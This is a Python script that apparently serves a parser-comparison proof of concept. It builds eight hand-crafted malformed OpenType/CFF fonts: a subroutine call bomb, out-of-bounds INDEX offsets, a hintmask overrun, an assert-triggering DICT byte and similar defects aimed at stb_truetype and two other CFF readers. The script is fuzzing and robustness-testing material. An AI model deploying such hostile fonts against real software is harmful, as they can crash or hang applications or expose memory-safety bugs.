"""Hand-made hostile CFF fonts for the #25 POC (docs/cff-rust-vs-c.md).

    python3 craft.py <out-dir>

Each font is a minimal OpenType file stb_truetype accepts (cmap, head, hhea,
hmtx, maxp, CFF) with one defect a real-world corrupt or malicious font could
have. fuzz.c's `one` mode replays them through stb, cff.c and cff.rs.
"""
import struct
import sys


def index(items):
    """A CFF INDEX with 4-byte offsets."""
    if not items:
        return b'\0\0'
    out = struct.pack('>HB', len(items), 4)
    offset = 1
    out += struct.pack('>I', offset)
    for item in items:
        offset += len(item)
        out += struct.pack('>I', offset)
    return out + b''.join(items)


def num(v):
    """A charstring integer."""
    if -107 <= v <= 107:
        return bytes([v + 139])
    return b'\x1c' + struct.pack('>h', v)


def dint(v):
    """A DICT integer, always 5 bytes so offsets can be patched in place."""
    return b'\x1d' + struct.pack('>i', v)


RMOVE, RLINE, ENDCHAR, CALLGSUBR, RETURN = b'\x15', b'\x05', b'\x0e', b'\x1d', b'\x0b'
BOX = num(100) + num(100) + RMOVE + num(500) + num(0) + RLINE + num(0) + num(500) + RLINE + ENDCHAR


def cff(charstrings, gsubrs=(), private=b'', top_extra=b'', cid=None):
    """Lay out a CFF table. `cid` is (FDArray dicts, FDSelect bytes)."""
    header = b'\x01\x00\x04\x04'
    names = index([b'X'])
    strings = index([])
    gsub = index(list(gsubrs))

    def build(at_charstrings, at_private, at_fdarray, at_fdselect):
        top = dint(at_charstrings) + b'\x11' + top_extra
        if private:
            top += dint(len(private)) + dint(at_private) + b'\x12'
        if cid:
            top += dint(at_fdarray) + b'\x0c\x24' + dint(at_fdselect) + b'\x0c\x25'
        return header + names + index([top]) + strings + gsub

    # Two passes: the Top DICT's size does not depend on the offsets in it.
    head = build(0, 0, 0, 0)
    body = b''
    at_charstrings = len(head)
    body += index(charstrings)
    at_private = len(head) + len(body)
    body += private
    at_fdarray = at_fdselect = 0
    if cid:
        dicts, fdselect = cid
        at_fdarray = len(head) + len(body)
        body += index(dicts)
        at_fdselect = len(head) + len(body)
        body += fdselect
    return build(at_charstrings, at_private, at_fdarray, at_fdselect) + body


def sfnt(cff_table, glyphs):
    cmap_sub = struct.pack('>7H', 4, 32, 0, 4, 4, 1, 0)  # format 4, two segments
    cmap_sub += struct.pack('>2H', 0x41, 0xffff) + b'\0\0' + struct.pack('>2H', 0x41, 0xffff)
    cmap_sub += struct.pack('>2h', 1 - 0x41, 1) + struct.pack('>2H', 0, 0)  # 'A' -> glyph 1
    cmap = struct.pack('>HH', 0, 1) + struct.pack('>HHI', 3, 1, 12) + cmap_sub
    head = struct.pack('>IIIIHHQQhhhhHHhhh', 0x10000, 0, 0, 0x5F0F3CF5, 0, 1000, 0, 0, 0, 0, 1000, 1000, 0, 8, 2, 0, 0)
    hhea = struct.pack('>I3hH3h3h4hhH', 0x10000, 800, -200, 0, 1000, 0, 0, 1000, 1, 0, 0, 0, 0, 0, 0, 0, glyphs)
    hmtx = struct.pack('>Hh', 600, 0) * glyphs
    maxp = struct.pack('>IH', 0x5000, glyphs)
    tables = sorted({b'CFF ': cff_table, b'cmap': cmap, b'head': head, b'hhea': hhea, b'hmtx': hmtx, b'maxp': maxp}.items())
    out = struct.pack('>IHHHH', 0x4F54544F, len(tables), 0, 0, 0)
    at = 12 + 16 * len(tables)
    # The CFF table goes last and unpadded, so the file ends where it does.
    placed = {}
    data = b''
    for tag, t in sorted(tables, key=lambda kv: kv[0] == b'CFF '):
        placed[tag] = at + len(data)
        data += t + (b'\0' * (-len(t) % 4) if tag != b'CFF ' else b'')
    for tag, t in tables:
        out += tag + struct.pack('>III', 0, placed[tag], len(t))
    return out + data


def subr_bomb():
    # Ten levels of global subrs, each calling the next eight times: 8^10
    # calls. stb's depth limit is 10, but nothing limits fan-out.
    bias = 107
    levels = []
    for k in range(10):
        if k < 9:
            levels.append((num(k + 1 - bias) + CALLGSUBR) * 8 + RETURN)
        else:
            levels.append(num(1) + num(1) + RLINE + RETURN)
    glyph = num(0) + num(0) + RMOVE + num(-bias) + CALLGSUBR + ENDCHAR
    return sfnt(cff([BOX, glyph], gsubrs=levels), 2)


def index_past_table():
    # The CharStrings INDEX's last offset points 1 MB past the table, and the
    # last charstring has no endchar, so a reader runs on past the file.
    last = BOX[:-1]
    t = bytearray(cff([BOX, last]))
    end = t.rfind(struct.pack('>I', 1 + len(BOX) + len(last)))
    t[end:end + 4] = struct.pack('>I', 1 << 20)
    return sfnt(bytes(t), 2)


def hintmask_overflow():
    # Forty hstems, then a hintmask whose mask bytes run off the charstring.
    stems = b''.join(num(10) + num(10) for _ in range(20)) + b'\x01'
    glyph = num(0) + num(0) + RMOVE + num(1) + num(1) + RLINE + stems * 2 + b'\x13'
    return sfnt(cff([BOX, glyph]), 2)


def private_real():
    # The Private DICT's Subrs offset is a real number.
    return sfnt(cff([BOX, BOX], private=b'\x1e\x1f' + b'\x13'), 2)


def dict_byte_31():
    # A Top DICT operand byte stb_truetype asserts on.
    return sfnt(cff([BOX, BOX], top_extra=b'\x1f\x00'), 2)


def fewer_charstrings():
    # maxp says 6 glyphs; CharStrings has 2.
    return sfnt(cff([BOX, BOX]), 6)


def fdselect_gap():
    # A CID font whose FDSelect starts at glyph 1: glyph 0 has no font dict.
    fd = dint(0) + dint(0) + b'\x12'
    fdselect = b'\x03' + struct.pack('>H', 1) + struct.pack('>HB', 1, 0) + struct.pack('>H', 2)
    glyph = num(0) + num(0) + RMOVE + num(0) + b'\x0a' + ENDCHAR  # callsubr
    return sfnt(cff([glyph, BOX], cid=([fd], fdselect)), 2)


def bad_offsize():
    # The Global Subrs INDEX claims 7-byte offsets.
    t = bytearray(cff([BOX, BOX], gsubrs=[RETURN]))
    at = t.find(index([RETURN]))
    t[at + 2] = 7
    return sfnt(bytes(t), 2)


CASES = [subr_bomb, index_past_table, hintmask_overflow, private_real, dict_byte_31,
         fewer_charstrings, fdselect_gap, bad_offsize]

if __name__ == '__main__':
    for case in CASES:
        with open('%s/%s.otf' % (sys.argv[1], case.__name__), 'wb') as f:
            f.write(case())
    # A well-formed control: must draw in all three.
    with open('%s/control.otf' % sys.argv[1], 'wb') as f:
        f.write(sfnt(cff([BOX, BOX]), 2))
